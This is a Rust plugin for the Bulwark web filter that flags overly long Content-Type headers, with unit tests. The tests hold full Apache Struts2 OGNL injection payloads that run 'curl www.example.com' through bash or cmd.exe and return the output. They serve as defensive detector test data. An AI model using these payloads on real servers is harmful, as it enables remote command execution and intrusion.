use bulwark_wasm_sdk::*;
use std::collections::HashMap;

pub struct LongContentType;

/// The maximum length for the `Content-Type` header before we begin considering it suspicious.
const MAX_LEN: i64 = 120;
/// The maximum excess length for the `Content-Type` header before we cap the score.
const MAX_EXCESS: i64 = 150;
/// The maximum score for the `Content-Type` header at the capped length.
const MAX_SCORE: f64 = 0.75;
/// The calculated scale factor to multiply the excess by.
const SCALE_FACTOR: f64 = MAX_SCORE / MAX_EXCESS as f64;

impl LongContentType {
    /// Calculates the score for the `Content-Type` header based on its excess length, if any.
    fn score_content_type(content_type: &HeaderValue) -> f64 {
        let chars_above_max = Self::chars_above_max(content_type) as f64;
        (chars_above_max * SCALE_FACTOR).min(MAX_SCORE)
    }

    /// Determines how many characters there are above the header maximum length, if any.
    fn chars_above_max(content_type: &HeaderValue) -> usize {
        (content_type.len() as i64 - MAX_LEN).max(0) as usize
    }
}

#[bulwark_plugin]
impl HttpHandlers for LongContentType {
    fn handle_request_decision(
        request: Request,
        _params: HashMap<String, String>,
    ) -> Result<HandlerOutput, Error> {
        let mut output = HandlerOutput::default();
        if let Some(content_type) = request.headers().get("Content-Type") {
            let score = LongContentType::score_content_type(content_type);
            if score > 0.0 {
                output.tags = vec!["long-content-type".to_string()];
            }
            output.decision = Decision::restricted(score);
        }
        Ok(output)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use approx::assert_relative_eq;

    #[test]
    fn test_score_content_type() {
        let test_cases = vec![
            (HeaderValue::from_static("application/json"), 0.0),
            (
                HeaderValue::from_static(
                    "multipart/form-data; boundary=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                ),
                0.0,
            ),
            (
                HeaderValue::from_static(
                    r"%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('curl www.example.com'))}",
                ),
                0.145,
            ),
            (
                HeaderValue::from_static(
                    r"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl www.example.com').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                ),
                0.75,
            ),
        ];
        for (content_type, expected) in test_cases {
            let score = LongContentType::score_content_type(&content_type);
            assert_relative_eq!(score, expected);
        }
    }

    #[test]
    fn test_chars_above_max() {
        let test_cases = vec![
            (HeaderValue::from_static("application/json"), 0),
            (
                HeaderValue::from_static(
                    "multipart/form-data; boundary=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                ),
                0,
            ),
            (
                HeaderValue::from_static(
                    r"%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('curl www.example.com'))}",
                ),
                29,
            ),
            (
                HeaderValue::from_static(
                    r"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl www.example.com').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                ),
                704,
            ),
        ];
        for (content_type, expected) in test_cases {
            let chars_above_max = LongContentType::chars_above_max(&content_type);
            assert_eq!(chars_above_max, expected);
        }
    }
}
